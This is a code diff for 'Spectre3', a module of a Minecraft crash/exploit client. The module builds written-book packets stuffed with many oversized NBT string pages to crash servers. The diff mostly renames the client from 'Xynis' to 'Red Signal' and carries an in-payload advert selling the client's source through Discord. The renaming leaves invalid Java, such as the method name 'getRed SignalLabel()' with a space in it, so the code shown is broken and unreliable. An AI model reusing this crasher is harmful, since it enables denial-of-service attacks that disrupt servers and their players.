@@ -8,7 +8,7 @@ import net.minecraft.nbt.StringTag;
 import net.minecraft.nbt.Tag;
 import us.whitedev.crashers.Crasher;
 import us.whitedev.gui.clickgui.ClickGui;
-import us.whitedev.protocol.XynisProtocol;
+import us.whitedev.protocol.RedSignalProtocol;
 import us.whitedev.protocol.components.data.DataComponents;
 import us.whitedev.protocol.components.data.impl.DataWrittenBookContent;
 import us.whitedev.protocol.components.data.impl.Filterable;
@@ -37,7 +37,7 @@ public class Spectre3 implements Crasher {
         msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);
 
         int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
-        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
+        if (RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
             Filterable<Tag> page = getPageContent(size, type);
             List<Filterable<Tag>> pages = new ArrayList<>(pagesAmount);
 
@@ -45,7 +45,7 @@ public class Spectre3 implements Crasher {
                 pages.add(page);
 
             DataWrittenBookContent bookContent = new DataWrittenBookContent(
-                    new Filterable<>("Xynis", null),
+                    new Filterable<>("Red Signal", null),
                     mc.player.getName().getString(),
                     1,
                     pages,
@@ -75,7 +75,7 @@ public class Spectre3 implements Crasher {
                 CompoundTag pageNbtBuilder = new CompoundTag();
 
                 for (int i = 0; i < size; ++i)
-                    pageNbtBuilder.putString(String.valueOf(i), getXynisLabel());
+                    pageNbtBuilder.putString(String.valueOf(i), getRed SignalLabel());
 
                 page = new Filterable<>(pageNbtBuilder, null);
             }
@@ -83,7 +83,7 @@ public class Spectre3 implements Crasher {
                 ListTag listTag = new ListTag();
 
                 for (int i = 0; i < size; ++i)
-                    listTag.add(i, new StringTag(getXynisLabel()));
+                    listTag.add(i, new StringTag(getRed SignalLabel()));
 
                 page = new Filterable<>(listTag, null);
             }
@@ -91,15 +91,15 @@ public class Spectre3 implements Crasher {
         return page;
     }
 
-    private String getXynisLabel(){
+    private String getRed SignalLabel(){
         return """
                         \s
                         \s
-                        BUY SOURCE OF XYNISCLIENT ON OUR DISCORD!
+                        BUY SOURCE OF RED SIGNALCLIENT ON OUR DISCORD!
                         BEST EXCLUSIVE CRASH/EXPLOIT CLIENT
                         
                         -> JOIN HERE: discord.gg/3jqFtrNnjc <-
-                        -> SUBSCRIBE TODAY: youtube.com/@xynis <-
+                        -> SUBSCRIBE TODAY: youtube.com/@redsignal <-
                         \s
                         \s
                         """;
